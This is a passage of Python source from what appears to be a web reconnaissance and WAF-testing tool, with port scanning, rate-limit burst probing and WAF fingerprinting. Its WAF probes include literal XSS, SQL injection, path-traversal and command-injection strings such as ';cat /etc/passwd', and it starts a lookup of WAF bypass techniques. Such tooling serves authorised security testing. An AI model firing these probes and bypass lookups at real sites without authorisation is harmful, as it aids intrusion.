                    entry["rate_limited"] = True
                    break

            return entry

        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        futures = {pool.submit(_probe_auth, p, c): p for p, c in _AUTH_PATHS}
        for future in concurrent.futures.as_completed(futures):
            try:
                entry = future.result()
                if entry:
                    found.append(entry)
            except Exception:
                pass

    # Categorize results
    by_category = {}
    for e in found:
        by_category.setdefault(e["category"], []).append(e)

    return {
        "endpoints": sorted(found, key=lambda x: x["path"]),
        "total": len(found),
        "categories": {k: len(v) for k, v in by_category.items()},
        "has_login": any(e["category"] == "login" for e in found),
        "has_registration": any(e["category"] == "registration" for e in found),
        "has_oauth": any(e["category"] == "oauth" for e in found),
        "has_mfa": any(e["category"] == "mfa" for e in found),
        "has_sso": any(e["category"] == "sso" for e in found),
    }


_COMMON_WEB_PORTS = [
    (21, "FTP"),
    (22, "SSH"),
    (25, "SMTP"),
    (53, "DNS"),
    (80, "HTTP"),
    (110, "POP3"),
    (143, "IMAP"),
    (443, "HTTPS"),
    (445, "SMB"),
    (993, "IMAPS"),
    (995, "POP3S"),
    (1433, "MSSQL"),
    (1521, "Oracle"),
    (2082, "cPanel"),
    (2083, "cPanel SSL"),
    (2086, "WHM"),
    (2087, "WHM SSL"),
    (3000, "Dev (Node/Grafana)"),
    (3306, "MySQL"),
    (3389, "RDP"),
    (4443, "HTTPS Alt"),
    (5432, "PostgreSQL"),
    (5900, "VNC"),
    (6379, "Redis"),
    (8000, "Dev/Django"),
    (8008, "HTTP Alt"),
    (8080, "HTTP Proxy"),
    (8443, "HTTPS Alt"),
    (8888, "HTTP Alt/Jupyter"),
    (9090, "Prometheus/Cockpit"),
    (9200, "Elasticsearch"),
    (9443, "HTTPS Alt"),
    (27017, "MongoDB"),
]


def check_open_ports(host: str, timeout: float = 2.0,
                     ports: Optional[List[Tuple[int, str]]] = None,
                     ) -> Dict[str, Any]:
    """Lightweight TCP port scan — connect() probe against common web ports.

    Returns:
      - open: list of {port, service, banner?}
      - closed: count of closed ports
      - filtered: count of filtered (timeout) ports
      - total_scanned: total ports probed
    """
    import concurrent.futures

    target_ports = ports or _COMMON_WEB_PORTS
    open_ports = []
    filtered = 0
    closed = 0

    def _probe_port(port_num: int, service_name: str):
        try:
            sock = socket.create_connection((host, port_num), timeout=timeout)
            # Try to grab a banner (50ms read timeout)
            banner = None
            try:
                sock.settimeout(0.3)
                data = sock.recv(1024)
                if data:
                    banner = data.decode("utf-8", errors="replace").strip()[:200]
            except (socket.timeout, OSError):
                pass
            sock.close()
            return {"port": port_num, "service": service_name, "state": "open",
                    "banner": banner}
        except socket.timeout:
            return {"port": port_num, "service": service_name, "state": "filtered"}
        except (ConnectionRefusedError, OSError):
            return {"port": port_num, "service": service_name, "state": "closed"}

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        futures = {pool.submit(_probe_port, p, s): p for p, s in target_ports}
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                if result["state"] == "open":
                    open_ports.append(result)
                elif result["state"] == "filtered":
                    filtered += 1
                else:
                    closed += 1
            except Exception:
                closed += 1

    # Sort by port number
    open_ports.sort(key=lambda x: x["port"])

    # Classify risk
    risky_ports = []
    _RISKY = {21, 22, 445, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 9200, 27017}
    for op in open_ports:
        if op["port"] in _RISKY:
            risky_ports.append(op)

    return {
        "open": open_ports,
        "open_count": len(open_ports),
        "closed": closed,
        "filtered": filtered,
        "total_scanned": len(target_ports),
        "risky_ports": risky_ports,
    }


_CRITICAL_PATHS = [
    "/login", "/api", "/api/v1", "/graphql",
    "/admin", "/dashboard", "/console",
    "/signup", "/register",
    "/oauth/token", "/auth/token", "/api/auth/login",
    "/i/flow/login",           # Twitter/X
    "/password-reset", "/forgot-password",
    "/wp-admin", "/wp-login.php", "/administrator",
    "/actuator", "/actuator/health",
]

# How many requests to send in the burst probe
_RATE_LIMIT_BURST_COUNT = 15   # safe default — enough to trigger most rate limits
# Paths to burst-probe (subset of critical paths — these are highest value)
_BURST_PROBE_PATHS = [
    "/login", "/api/v1", "/api", "/graphql",
    "/signup", "/oauth/token", "/i/flow/login",
]


def check_rate_limits_critical(host: str, port: int, use_ssl: bool,
                               timeout: int = 6,
                               extra_headers: Optional[Dict[str, str]] = None,
                               subdomains: Optional[list] = None) -> Dict[str, Any]:
    """Lightweight rate-limit probe for critical paths only.

    Instead of full burst testing against every subdomain/endpoint,
    sends a single request to each critical path and checks for
    rate-limit headers. Fast enough to include in default recon.

    Args:
        host: Target hostname
        port: Target port
        use_ssl: Whether to use SSL
        timeout: Per-request timeout
        extra_headers: Additional headers
        subdomains: Optional list of subdomains to also probe

    Returns:
        Dict with per-path rate limit headers and a summary.
    """
    import concurrent.futures

    result: Dict[str, Any] = {
        "paths_checked": 0,
        "rate_limited_paths": [],
        "headers_by_path": {},
        "most_restrictive": None,
        "summary": "unknown",
    }

    req_headers = {
        "Host": host,
        "User-Agent": f"Fray/{__version__} Recon",
        "Accept": "text/html,*/*",
        "Connection": "close",
    }
    if extra_headers:
        req_headers.update(extra_headers)

    # Build probe targets: critical paths on main host + optional subdomains
    targets: list = [(host, p) for p in _CRITICAL_PATHS]
    if subdomains:
        # Only probe critical subdomains (admin, api, dev, staging)
        critical_prefixes = {"admin", "api", "dev", "staging", "test", "internal",
                             "dashboard", "console", "portal", "vpn", "sso", "auth"}
        for sub in subdomains[:50]:
            fqdn = sub if isinstance(sub, str) else sub.get("fqdn", "")
            if not fqdn:
                continue
            prefix = fqdn.split(".")[0].lower()
            if prefix in critical_prefixes:
                targets.append((fqdn, "/"))

    def _probe_one(target_host: str, path: str):
        """Single GET and return rate-limit headers if present."""
        try:
            hdrs = dict(req_headers)
            hdrs["Host"] = target_host
            if use_ssl:
                try:
                    ctx = _make_ssl_context(verify=True)
                    conn = http.client.HTTPSConnection(target_host, port, context=ctx, timeout=timeout)
                    conn.request("GET", path, headers=hdrs)
                    resp = conn.getresponse()
                except ssl.SSLError:
                    ctx = _make_ssl_context(verify=False)
                    conn = http.client.HTTPSConnection(target_host, port, context=ctx, timeout=timeout)
                    conn.request("GET", path, headers=hdrs)
                    resp = conn.getresponse()
            else:
                conn = http.client.HTTPConnection(target_host, port, timeout=timeout)
                conn.request("GET", path, headers=hdrs)
                resp = conn.getresponse()

            status = resp.status
            resp_headers = {k.lower(): v for k, v in resp.getheaders()}
            resp.read(512)
            conn.close()

            rl = {}
            for key in ("x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset",
                        "ratelimit-limit", "ratelimit-remaining", "ratelimit-reset",
                        "x-rate-limit-limit", "x-rate-limit-remaining",
                        "retry-after"):
                if key in resp_headers:
                    rl[key] = resp_headers[key]

            return {
                "host": target_host,
                "path": path,
                "status": status,
                "rate_limit_headers": rl,
                "is_rate_limited": status == 429 or bool(rl),
            }
        except Exception:
            return None

    # ── Phase 1: Single-request passive probe ────────────────────────────
    probed = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        futures = {pool.submit(_probe_one, h, p): (h, p) for h, p in targets[:30]}
        for future in concurrent.futures.as_completed(futures):
            try:
                r = future.result()
                if r:
                    probed.append(r)
            except Exception:
                pass

    # ── Phase 2: Burst probe on critical paths ────────────────────────────
    # Send _RATE_LIMIT_BURST_COUNT concurrent requests to detect rate limits
    # that only trigger under real load (429/503). Only on main host paths
    # that returned a real response in Phase 1.
    burst_candidates = [
        p for p in probed
        if p.get("host") == host
        and any(bp in p.get("path", "") for bp in _BURST_PROBE_PATHS)
        and p.get("status", 0) not in (0, 404, 410)
        and not p.get("is_rate_limited")
    ]

    def _burst_probe_path(target_host: str, path: str,
                          n: int = _RATE_LIMIT_BURST_COUNT) -> Dict[str, Any]:
        """Send N concurrent GETs; detect if any return 429/503."""
        hdrs = dict(req_headers)
        hdrs["Host"] = target_host
        statuses: list = []
        first_429_idx = None

        def _one(_i):
            try:
                _ctx = _make_ssl_context(verify=False)
                _conn = http.client.HTTPSConnection(target_host, port,
                                                    context=_ctx, timeout=3)
                _conn.request("GET", path, headers=hdrs)
                _resp = _conn.getresponse()
                _st = _resp.status
                _rh = {k.lower(): v for k, v in _resp.getheaders()}
                _resp.read(64)
                _conn.close()
                return _st, _rh
            except Exception:
                return 0, {}

        with concurrent.futures.ThreadPoolExecutor(max_workers=min(n, 25)) as bp:
            futs = {bp.submit(_one, i): i for i in range(n)}
            for fut in concurrent.futures.as_completed(futs):
                try:
                    st, rh = fut.result()
                    statuses.append(st)
                    idx = futs[fut]
                    if st in (429, 503) and first_429_idx is None:
                        first_429_idx = idx + 1
                except Exception:
                    pass

        is_limited = first_429_idx is not None or statuses.count(429) > 0
        return {
            "host": target_host,
            "path": path,
            "burst_count": n,
            "is_rate_limited": is_limited,
            "first_429_at": first_429_idx,
            "status_distribution": {str(s): statuses.count(s)
                                     for s in sorted(set(statuses)) if s},
        }

    burst_results: list = []
    for bp_item in burst_candidates[:3]:  # max 3 paths
        br = _burst_probe_path(bp_item["host"], bp_item["path"])
        burst_results.append(br)
        if br["is_rate_limited"]:
            bp_item["is_rate_limited"] = True
            bp_item["burst_triggered"] = True
            bp_item["rate_limited_at_req"] = br["first_429_at"]
    result["burst_results"] = burst_results

    result["paths_checked"] = len(probed)

    # Aggregate findings
    rate_limited = [p for p in probed if p["is_rate_limited"]]
    result["rate_limited_paths"] = [
        {"host": p["host"], "path": p["path"], "status": p["status"],
         "headers": p["rate_limit_headers"]}
        for p in rate_limited
    ]

    # Find most restrictive limit
    min_limit = None
    for p in rate_limited:
        for key in ("x-ratelimit-limit", "ratelimit-limit", "x-rate-limit-limit"):
            val = p["rate_limit_headers"].get(key)
            if val:
                try:
                    limit_int = int(val)
                    if min_limit is None or limit_int < min_limit:
                        min_limit = limit_int
                        result["most_restrictive"] = {
                            "host": p["host"],
                            "path": p["path"],
                            "limit": limit_int,
                            "headers": p["rate_limit_headers"],
                        }
                except (ValueError, TypeError):
                    pass

    # Collect all headers by path for display
    for p in probed:
        if p["rate_limit_headers"]:
            key = f"{p['host']}{p['path']}"
            result["headers_by_path"][key] = p["rate_limit_headers"]

    if not rate_limited:
        result["summary"] = "No rate limiting detected on critical paths"
    elif len(rate_limited) == len(probed):
        result["summary"] = f"All {len(probed)} critical paths are rate-limited"
    else:
        result["summary"] = (f"{len(rate_limited)}/{len(probed)} critical paths "
                             f"have rate limiting")

    return result


def check_rate_limits(host: str, port: int, use_ssl: bool,
                      timeout: int = 8,
                      extra_headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """Fingerprint the rate limit threshold — requests/second before 429.

    Sends escalating bursts of benign requests to map the exact threshold
    where the WAF/server starts returning 429 or block responses.

    Returns:
        Dict with threshold (req/s), burst_limit, retry_after policy,
        rate_limit_headers, and recommended_delay for safe testing.
    """
    result: Dict[str, Any] = {
        "threshold_rps": None,         # requests/sec before 429
        "burst_limit": None,           # max burst before first 429
        "retry_after_policy": None,    # value of Retry-After header
        "rate_limit_headers": {},      # X-RateLimit-* headers
        "lockout_duration": None,      # seconds until unlocked
        "recommended_delay": 0.5,      # safe delay for testing
        "detection_type": None,        # "fixed-window", "sliding-window", "token-bucket", "none"
        "error": None,
    }

    path = "/"
    req_headers = {
        "Host": host,
        "User-Agent": f"Fray/{__version__} Recon",
        "Accept": "text/html,*/*",
        "Connection": "close",
    }
    if extra_headers:
        req_headers.update(extra_headers)

    def _send_one() -> Tuple[int, Dict[str, str], float]:
        """Send a single benign GET and return (status, headers, elapsed)."""
        try:
            start = time.monotonic()
            if use_ssl:
                try:
                    ctx = _make_ssl_context(verify=True)
                    conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
                    conn.request("GET", path, headers=req_headers)
                    resp = conn.getresponse()
                except ssl.SSLError:
                    ctx = _make_ssl_context(verify=False)
                    conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
                    conn.request("GET", path, headers=req_headers)
                    resp = conn.getresponse()
            else:
                conn = http.client.HTTPConnection(host, port, timeout=timeout)
                conn.request("GET", path, headers=req_headers)
                resp = conn.getresponse()

            elapsed = time.monotonic() - start
            status = resp.status
            headers = {k.lower(): v for k, v in resp.getheaders()}
            resp.read(1024)  # Drain
            conn.close()
            return status, headers, elapsed
        except Exception:
            return 0, {}, 0.0

    # Phase 1: Baseline — single request to capture rate limit headers + session cookie
    status, headers, _ = _send_one()
    if status == 0:
        result["error"] = "Target unreachable"
        return result

    # ── Cookie capture and reuse ────────────────────────────────────────────
    # Many services use cookies (not just IP) to track rate limits:
    #   - Cloudflare: cf_clearance, __cf_bm
    #   - Akamai: ak_bmsc, _abck, bm_sz
    #   - Google reCAPTCHA: NID, SID
    #   - AWS WAF: aws-waf-token
    #   - Imperva: visid_incap, incap_ses
    #   - DataDome: datadome
    #   - Generic session: session, sessionid, JSESSIONID, PHPSESSID
    # We capture the Set-Cookie from the first response and replay it on
    # subsequent requests to ensure consistent session identity — this
    # prevents counting as a new IP-session each time and gets accurate
    # cookie-based rate limit readings.
    session_cookie = None
    set_cookie_hdr = headers.get("set-cookie", "")
    if set_cookie_hdr:
        # Extract just name=value (no path/domain/expires)
        cookie_parts = [c.split(";")[0].strip() for c in set_cookie_hdr.split(",")
                        if c.strip()]
        if cookie_parts:
            session_cookie = "; ".join(p for p in cookie_parts if "=" in p)
            result["session_cookie_detected"] = True
            result["session_cookie_mechanism"] = (
                "Cloudflare (__cf_bm)" if "__cf_bm" in set_cookie_hdr else
                "Cloudflare (cf_clearance)" if "cf_clearance" in set_cookie_hdr else
                "Akamai (_abck)" if "_abck" in set_cookie_hdr else
                "Akamai (ak_bmsc)" if "ak_bmsc" in set_cookie_hdr else
                "DataDome" if "datadome" in set_cookie_hdr.lower() else
                "Imperva" if "incap_ses" in set_cookie_hdr or "visid_incap" in set_cookie_hdr else
                "AWS WAF" if "aws-waf-token" in set_cookie_hdr else
                "Session cookie"
            )
            # Add cookie to subsequent requests
            req_headers["Cookie"] = session_cookie

    # Capture any rate limit headers from the first response
    rl_headers = {}
    for key in list(_API_RATE_LIMIT_HEADERS.keys()) + [
        "x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset",
        "ratelimit-limit", "ratelimit-remaining", "ratelimit-reset",
        "x-rate-limit-limit", "x-rate-limit-remaining", "x-rate-limit-reset",
        "retry-after",
    ]:
        if key in headers:
            rl_headers[key] = headers[key]
    result["rate_limit_headers"] = rl_headers

    # If we already see rate limit headers, extract the declared limit
    declared_limit = None
    for key in ("x-ratelimit-limit", "ratelimit-limit", "x-rate-limit-limit"):
        if key in rl_headers:
            try:
                declared_limit = int(rl_headers[key])
                break
            except (ValueError, TypeError):
                pass

    # Phase 2: Escalating burst test — find the actual threshold
    # Start with small bursts, double each round: 2, 4, 8, 16, 32
    burst_sizes = [2, 4, 8, 16, 32]
    first_429_at = None

    for burst_size in burst_sizes:
        blocked_count = 0
        for _ in range(burst_size):
            s, h, _ = _send_one()
            if s in (429, 503) or s == 0:
                blocked_count += 1
                if first_429_at is None:
                    first_429_at = burst_size
                # Capture retry-after from the 429 response
                if "retry-after" in h and result["retry_after_policy"] is None:
                    result["retry_after_policy"] = h["retry-after"]
                    try:
                        result["lockout_duration"] = int(h["retry-after"])
                    except (ValueError, TypeError):
                        pass
                break  # Stop this burst on first 429

        if blocked_count > 0:
            break

        # Small cooldown between bursts to avoid false positives
        time.sleep(0.3)

    # Phase 3: If we hit 429, do a binary search for the exact threshold
    if first_429_at is not None:
        result["burst_limit"] = first_429_at

        # Wait for lockout to expire before probing further
        lockout_wait = result["lockout_duration"] or 5
        time.sleep(min(lockout_wait, 10))

        # Binary search: probe between burst_size/2 and burst_size
        lo = max(1, first_429_at // 2)
        hi = first_429_at
        for _ in range(4):  # Max 4 iterations of binary search
            mid = (lo + hi) // 2
            if mid == lo:
                break
            time.sleep(min(lockout_wait, 5))  # Cooldown between probes
            hit_429 = False
            for _ in range(mid):
                s, _, _ = _send_one()
                if s in (429, 503):
                    hit_429 = True
                    break
            if hit_429:
                hi = mid
            else:
                lo = mid
        result["burst_limit"] = lo

        # Estimate RPS threshold: burst_limit / time_window (assume 1s window)
        result["threshold_rps"] = lo

        # Classify detection type
        if declared_limit:
            result["detection_type"] = "fixed-window"
            result["threshold_rps"] = declared_limit
        else:
            # Heuristic: if burst_limit is small (<5), likely token-bucket
            if lo <= 5:
                result["detection_type"] = "token-bucket"
            else:
                result["detection_type"] = "sliding-window"

        # Recommend a safe delay
        if result["threshold_rps"] and result["threshold_rps"] > 0:
            result["recommended_delay"] = round(1.0 / (result["threshold_rps"] * 0.6), 2)
        else:
            result["recommended_delay"] = 2.0
    else:
        # No rate limiting detected
        result["detection_type"] = "none"
        result["threshold_rps"] = None
        result["burst_limit"] = None
        result["recommended_delay"] = 0.2  # Fast testing is safe
        if declared_limit:
            result["threshold_rps"] = declared_limit
            result["detection_type"] = "declared-only"
            result["recommended_delay"] = round(1.0 / (declared_limit * 0.6), 2)

    return result


# ── Differential Response Analysis ──────────────────────────────────────

def check_differential_responses(host: str, port: int, use_ssl: bool,
                                  timeout: int = 4,
                                  extra_headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
    """Compare responses between benign and malicious requests to fingerprint WAF detection mode.

    Sends a benign request, then known-blocked payloads, and measures:
    - Status code differences
    - Response body length differences
    - Response time differences (timing side-channel)
    - Header differences (new headers added by WAF)
    - Body content differences (block page signatures)

    Determines if WAF uses signature-based or anomaly-based detection.
    """
    result: Dict[str, Any] = {
        "detection_mode": None,         # "signature", "anomaly", "hybrid", "none"
        "baseline": {},                 # benign response fingerprint
        "blocked_fingerprint": {},      # blocked response fingerprint
        "timing_delta_ms": None,        # avg blocked - avg benign (ms)
        "body_length_delta": None,      # blocked body len - benign body len
        "status_code_pattern": None,    # e.g. "200->403" or "200->200 (soft block)"
        "extra_headers_on_block": [],   # headers only present on blocked responses
        "block_page_signatures": [],    # WAF block page indicators found
        "signature_detection": [],      # payloads that triggered signature blocks
        "anomaly_detection": [],        # payloads that triggered anomaly blocks
        "error": None,
    }

    path = "/"
    req_template = (
        "{method} {path} HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "User-Agent: Fray/{version} Recon\r\n"
        "Accept: text/html,*/*\r\n"
        "{extra}"
        "Connection: close\r\n\r\n{body}"
    )
    extra_hdr_str = ""
    if extra_headers:
        extra_hdr_str = "".join(f"{k}: {v}\r\n" for k, v in extra_headers.items())

    def _send_raw(method: str, req_path: str, body: str = "") -> Tuple[int, Dict[str, str], str, float]:
        """Send raw request, return (status, headers, body, elapsed_ms)."""
        try:
            req = req_template.format(
                method=method, path=req_path, host=host,
                version=__version__, extra=extra_hdr_str, body=body,
            )
            start = time.monotonic()
            if use_ssl:
                try:
                    ctx = _make_ssl_context(verify=True)
                    sock = socket.create_connection((host, port), timeout=timeout)
                    conn = ctx.wrap_socket(sock, server_hostname=host)
                except ssl.SSLError:
                    ctx = _make_ssl_context(verify=False)
                    sock = socket.create_connection((host, port), timeout=timeout)
                    conn = ctx.wrap_socket(sock, server_hostname=host)
            else:
                conn = socket.create_connection((host, port), timeout=timeout)

            conn.sendall(req.encode("utf-8", errors="replace"))
            resp = b""
            while True:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    resp += data
                    # Early exit: once we have headers + start of body, stop reading
                    if b"\r\n\r\n" in resp and len(resp) > 512:
                        break
                    if len(resp) > 16000:
                        break
                except (socket.error, socket.timeout, OSError):
                    break
            conn.close()
            elapsed_ms = (time.monotonic() - start) * 1000

            resp_str = resp.decode("utf-8", errors="replace")
            status_match = re.search(r"HTTP/[\d.]+ (\d+)", resp_str)
            status = int(status_match.group(1)) if status_match else 0

            headers = {}
            body_str = ""
            if "\r\n\r\n" in resp_str:
                header_section, body_str = resp_str.split("\r\n\r\n", 1)
                for line in header_section.split("\r\n")[1:]:
                    if ":" in line:
                        k, v = line.split(":", 1)
                        headers[k.strip().lower()] = v.strip()

            return status, headers, body_str, elapsed_ms
        except Exception as e:
            return 0, {}, str(e), 0.0

    # ── Phase 1: Baseline (benign requests) ──
    benign_statuses = []
    benign_lengths = []
    benign_times = []
    benign_headers_set = set()

    for _ in range(2):
        s, h, b, t = _send_raw("GET", path)
        if s == 0:
            continue
        benign_statuses.append(s)
        benign_lengths.append(len(b))
        benign_times.append(t)
        benign_headers_set.update(h.keys())
        time.sleep(0.1)

    if not benign_statuses:
        result["error"] = "Target unreachable for baseline"
        return result

    avg_benign_status = max(set(benign_statuses), key=benign_statuses.count)
    avg_benign_len = sum(benign_lengths) // len(benign_lengths) if benign_lengths else 0
    avg_benign_time = sum(benign_times) / len(benign_times) if benign_times else 0

    # ── Follow redirect: if baseline is 301/302, re-probe the redirect target ──
    # Sites like amazon.co.jp redirect to www.amazon.co.jp — the WAF is on the
    # final destination, not the redirect stub.
    redirect_host = None
    if avg_benign_status in (301, 302, 307, 308):
        # Extract Location from the last benign response
        last_s, last_h, last_b, last_t = _send_raw("GET", path)
        loc = last_h.get("location", "")
        if loc:
            import urllib.parse as _up
            parsed_loc = _up.urlparse(loc if loc.startswith("http") else f"https://{host}{loc}")
            redir_host = parsed_loc.hostname
            redir_path = parsed_loc.path or "/"
            redir_ssl = parsed_loc.scheme == "https"
            redir_port = parsed_loc.port or (443 if redir_ssl else 80)
            if redir_host and redir_host != host:
                redirect_host = redir_host
                result["redirect_followed"] = f"{host} -> {redir_host}"
                # Re-send baseline against redirect target
                _orig_host = host
                host = redir_host
                path = redir_path
                port = redir_port
                use_ssl = redir_ssl
                # Update request template with new host
                req_template = (
                    "{method} {path} HTTP/1.1\r\n"
                    "Host: {host}\r\n"
                    "User-Agent: Fray/{version} Recon\r\n"
                    "Accept: text/html,*/*\r\n"
                    "{extra}"
                    "Connection: close\r\n\r\n{body}"
                )

                benign_statuses = []
                benign_lengths = []
                benign_times = []
                benign_headers_set = set()
                for _ in range(2):
                    s, h, b, t = _send_raw("GET", path)
                    if s == 0:
                        continue
                    benign_statuses.append(s)
                    benign_lengths.append(len(b))
                    benign_times.append(t)
                    benign_headers_set.update(h.keys())
                    time.sleep(0.1)

                if benign_statuses:
                    avg_benign_status = max(set(benign_statuses), key=benign_statuses.count)
                    avg_benign_len = sum(benign_lengths) // len(benign_lengths)
                    avg_benign_time = sum(benign_times) / len(benign_times)

    result["baseline"] = {
        "status": avg_benign_status,
        "body_length": avg_benign_len,
        "response_time_ms": round(avg_benign_time, 1),
        "headers": sorted(benign_headers_set),
    }
    if redirect_host:
        result["baseline"]["redirect_target"] = redirect_host

    # ── Phase 2: Signature-triggering payloads ──
    # URL-encoded payloads so they pass edge HTTP parsers and reach actual WAF rules.
    # Raw chars (<, ', ;) get 400'd by Cloudflare/CDN edge before the WAF sees them.
    signature_payloads = [
        ("XSS", "?input=%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
        ("SQLi", "?input=%27%20OR%201%3D1--"),
        ("Path Traversal", "?input=../../etc/passwd"),
        ("Command Injection", "?input=%3Bcat%20%2Fetc%2Fpasswd"),
        ("SSTI", "?input=%7B%7B7*7%7D%7D"),
    ]

    blocked_statuses = []
    blocked_lengths = []
    blocked_times = []
    blocked_headers_set = set()
    block_bodies = []

    def _is_blocked(s: int, b: str, sigs: tuple) -> bool:
        """Determine if a response indicates a WAF block vs normal page."""
        # Hard block: unambiguous status codes
        if s in (400, 403, 406, 429, 500, 503):
            return True
        # Empty body with different status = likely WAF drop/reset
        if s != avg_benign_status and (not b or len(b) == 0):
            return True
        # Dramatic body size change (>80% smaller) = block page replaced content
        if s != 0 and avg_benign_len > 100 and len(b) < avg_benign_len * 0.2:
            return True
        # Soft block: body must contain WAF signature AND differ
        # significantly from baseline (>20% body length delta)
        if s == avg_benign_status and b:
            body_len_ratio = abs(len(b) - avg_benign_len) / max(avg_benign_len, 1)
            if body_len_ratio < 0.2:
                # Response is same size as baseline — same page, not blocked
                return False
            b_lower = b.lower()
            if any(sig in b_lower for sig in sigs):
                return True
        elif b:
            # Different status code — check for block page content
            b_lower = b.lower()
            if any(sig in b_lower for sig in sigs):
                return True
        return False

    _sig_block_sigs = (
        "access denied", "blocked", "forbidden", "web application firewall",
        "captcha", "challenge", "error code:", "request blocked",
        "mod_security", "modsecurity", "attention required",
    )
    _anom_block_sigs = (
        "access denied", "blocked", "forbidden", "web application firewall",
        "captcha", "challenge",
    )

    # ── Phase 3: Anomaly-triggering payloads ──
    anomaly_payloads = [
        ("Long param", "?input=" + "A" * 2000),
        ("Unusual encoding", "?input=%00%0d%0a"),
        ("Unicode abuse", "?input=%ef%bc%9cscript%ef%bc%9e"),
        ("Double encoding", "?input=%253Cscript%253E"),
    ]

    # Send all payloads in parallel for speed
    import concurrent.futures as _cf_waf
    all_payloads = [(label, payload_path, _sig_block_sigs, "signature") for label, payload_path in signature_payloads] + \
                   [(label, payload_path, _anom_block_sigs, "anomaly") for label, payload_path in anomaly_payloads]

    def _probe_payload(args):
        label, payload_path, sigs, ptype = args
        s, h, b, t = _send_raw("GET", path + payload_path)
        if s == 0:
            return None
        is_blk = _is_blocked(s, b, sigs)
        return {"label": label, "payload": payload_path, "status": s,
                "response_time_ms": round(t, 1), "body_length": len(b),
                "blocked": is_blk, "type": ptype, "headers": h, "body": b, "time": t}

    with _cf_waf.ThreadPoolExecutor(max_workers=4) as _waf_pool:
        for res in _cf_waf.as_completed(
                [_waf_pool.submit(_probe_payload, p) for p in all_payloads], timeout=30):
            try:
                r = res.result(timeout=10)
                if r is None:
                    continue
                if r["blocked"]:
                    entry = {"label": r["label"], "payload": r["payload"],
                             "status": r["status"], "response_time_ms": r["response_time_ms"],
                             "body_length": r["body_length"]}
                    if r["type"] == "signature":
                        result["signature_detection"].append(entry)
                    else:
                        result["anomaly_detection"].append(entry)
                    blocked_statuses.append(r["status"])
                    blocked_lengths.append(r["body_length"])
                    blocked_times.append(r["time"])
                    blocked_headers_set.update(r["headers"].keys())
                    block_bodies.append(r["body"])
            except Exception:
                pass

    # ── Phase 4: Analyze differences ──
    if blocked_statuses:
        avg_blocked_status = max(set(blocked_statuses), key=blocked_statuses.count)
        avg_blocked_len = sum(blocked_lengths) // len(blocked_lengths)
        avg_blocked_time = sum(blocked_times) / len(blocked_times)

        result["blocked_fingerprint"] = {
            "status": avg_blocked_status,
            "body_length": avg_blocked_len,
            "response_time_ms": round(avg_blocked_time, 1),
            "headers": sorted(blocked_headers_set),
        }

        result["timing_delta_ms"] = round(avg_blocked_time - avg_benign_time, 1)
        result["body_length_delta"] = avg_blocked_len - avg_benign_len

        # Status code pattern
        if avg_blocked_status != avg_benign_status:
            result["status_code_pattern"] = f"{avg_benign_status}\u2192{avg_blocked_status}"
        else:
            result["status_code_pattern"] = f"{avg_benign_status}\u2192{avg_blocked_status} (soft block)"

        # Extra headers on block
        extra_on_block = blocked_headers_set - benign_headers_set
        result["extra_headers_on_block"] = sorted(extra_on_block)

        # Block page signatures
        for body in block_bodies:
            b_lower = body.lower()
            for sig_name, sig_pattern in [
                ("Cloudflare", "cf-error-details"),
                ("Cloudflare Ray", "ray id:"),
                ("Akamai", "reference #"),
                ("Imperva", "incident id"),
                ("AWS WAF", "request blocked"),
                ("ModSecurity", "modsecurity"),
                ("F5 BIG-IP", "the requested url was rejected"),
                ("Sucuri", "sucuri"),
                ("Generic WAF", "web application firewall"),
                ("CAPTCHA", "captcha"),
            ]:
                if sig_pattern in b_lower and sig_name not in result["block_page_signatures"]:
                    result["block_page_signatures"].append(sig_name)

        # Determine detection mode
        has_sig = len(result["signature_detection"]) > 0
        has_anomaly = len(result["anomaly_detection"]) > 0

        if has_sig and has_anomaly:
            result["detection_mode"] = "hybrid"
        elif has_sig:
            result["detection_mode"] = "signature"
        elif has_anomaly:
            result["detection_mode"] = "anomaly"
        else:
            result["detection_mode"] = "none"

    # ── Monitor mode detection ──
    # Send a definitive attack payload that no legitimate app generates.
    # If WAF is present (headers/cookies detected) but response is 200 with
    # normal body → WAF is in monitor/log-only mode, not actively blocking.
    result["waf_mode"] = "unknown"
    _monitor_probe = "?fray_waf_mode_test=' UNION SELECT 1,2,3,@@version--"
    _ms, _mh, _mb, _mt = _send_raw("GET", path + _monitor_probe)
    if _ms > 0:
        _is_monitor_blocked = _ms in (400, 403, 406, 429, 500, 503)
        if not _is_monitor_blocked and _mb:
            _mb_lower = _mb.lower()
            _is_monitor_blocked = any(s in _mb_lower for s in (
                "blocked", "forbidden", "denied", "captcha", "challenge",
                "web application firewall", "access denied"))
        if not _is_monitor_blocked and avg_benign_len > 100:
            _body_ratio = abs(len(_mb) - avg_benign_len) / max(avg_benign_len, 1)
            if _body_ratio > 0.5:
                _is_monitor_blocked = True

        if _is_monitor_blocked:
            result["waf_mode"] = "blocking"
        elif result.get("detection_mode", "none") != "none" or result.get("block_page_signatures"):
            # WAF signatures were found in other probes but this definitive one passed
            result["waf_mode"] = "monitoring"
        else:
            # No WAF signals at all + this probe passed = likely no WAF
            result["waf_mode"] = "blocking" if blocked_statuses else "no_waf"

        # ── Phase 5: WAF intel lookup — recommend bypass techniques ──
        try:
            from fray import load_waf_intel
            intel = load_waf_intel()
            vendors_db = intel.get("vendors", {})
            technique_matrix = intel.get("technique_matrix", {})

            # Identify WAF vendor from block page signatures + headers
            detected_vendor = None
            block_sigs = result.get("block_page_signatures", [])
            extra_hdrs = result.get("extra_headers_on_block", [])

            vendor_hints = {
                "cloudflare": (["Cloudflare", "Cloudflare Ray", "CAPTCHA"], ["cf-mitigated", "cf-ray"]),
                "aws_waf": (["AWS WAF"], ["x-amzn-waf-action"]),
                "azure_waf": ([], ["x-azure-ref", "x-msedge-ref"]),
                "akamai": (["Akamai"], []),
                "imperva": (["Imperva"], ["x-iinfo"]),
